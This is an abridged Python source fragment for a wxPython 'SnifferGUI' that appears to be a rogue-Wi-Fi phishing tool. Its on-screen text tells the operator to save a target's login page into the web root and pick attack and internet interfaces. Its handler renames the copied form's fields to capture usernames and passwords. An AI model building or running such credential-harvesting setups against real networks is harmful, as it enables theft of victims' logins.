...
class SnifferGUI(wx.Frame):
	...
	def InitUI(self):
		...
		self.myLabel = wx.StaticText(panel, -1, label='Currently, fully page download automation is not fully implemented.\nPlease save the login page as /var/www/login.html or /var/www/html/login.html \nChange permission to 755 for all web contents you downloaded\nAnd press the Modify button. \nAfter modifying the fields to capture click on attack to proceed with the attack', pos=(10, 20))
		...
		self.nDeviceList = wx.ComboBox(panel, -1, value='Select Attack Interface', size=(200, 30), pos=(250, 265), choices = wless_commands.get_net_devices())
		
		self.nDeviceList2 = wx.ComboBox(panel, -1, value='Select Internet Interface', size=(200, 30), pos=(522, 265), choices = wless_commands.get_net_devices())
	...
	def executeCommand(self,e):
		...
		tmp = read_html2.replace('name="'+str(user)+'"','name="username"').replace('name="'+str(password)+'"', 'name="password"')
